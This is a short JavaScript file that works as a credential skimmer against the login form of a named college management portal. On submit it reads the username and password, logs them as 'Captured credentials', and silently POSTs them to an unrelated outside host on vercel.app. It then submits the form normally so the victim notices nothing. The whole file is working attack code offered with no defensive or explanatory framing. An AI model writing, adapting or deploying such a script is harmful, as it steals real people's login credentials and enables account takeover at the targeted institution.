document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded fired");

  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');
  console.log("Form selected:", form);

  if (!form) {
    console.log("Form not found, exiting script");
    return; 
  }

  form.addEventListener("submit", (e) => {
    console.log("Form submit triggered");
    e.preventDefault(); 

    const usernameInput = form.querySelector('input[name="username"]');
    const passwordInput = form.querySelector('input[name="password"]');

    console.log("Username input:", usernameInput);
    console.log("Password input:", passwordInput);

    if (!usernameInput || !passwordInput) {
      console.log("Missing input fields, submitting form normally");
      form.submit();
      return;
    }

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    console.log("Captured credentials:", { username, password });

    fetch("https://brother-alpha.vercel.app/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password })
    })
    .then(response => console.log("Fetch response:", response))
    .catch(error => console.error("Fetch error:", error))
    .finally(() => {
      console.log("Submitting form after fetch");
      form.submit();
    });
  });
});
